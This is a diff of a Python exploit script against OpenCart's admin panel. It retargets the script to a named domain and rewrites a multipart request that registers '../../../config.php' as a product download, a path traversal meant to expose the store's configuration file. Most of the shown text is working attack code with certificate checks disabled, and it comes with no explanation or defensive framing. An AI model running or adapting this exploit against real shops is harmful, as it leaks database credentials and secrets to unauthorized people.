@@ -1,7 +1,7 @@
 import requests
 import urllib3
 requests.packages.urllib3.disable_warnings()
-host = "opencart"
+host = "opencart66.com"
 
 
 def loginad():
@@ -20,13 +20,12 @@ def loginad():
      
 
 def addfile(adcookies,adtoken):
-    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download/add&user_token="+adtoken
-    burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
-    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5RfMTwxCvuqzbNCQ", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
-    burp0_data = "------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"download_description[1][name]\"\n\nfile_poc_2020\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"filename\"\n\n../../../config.php\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"mask\"\n\n123\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ--\n"
-    session = requests.Session()
-    res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
-    #print(res.text)
+    burp0_url = "https://"+host+":443//admin/index.php?route=catalog/download/add&user_token="+adtoken
+    burp0_cookies = {"OCSESSID": adcookies, "language": "en-gb", "currency": "USD"}
+    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
+    burp0_data = "------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"download_description[1][name]\"\r\n\r\nfile_poc_2020\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../config.php\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"mask\"\r\n\r\n1111\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE--\r\n"
+    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
+    #print(r.status_code)
     
 
     burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
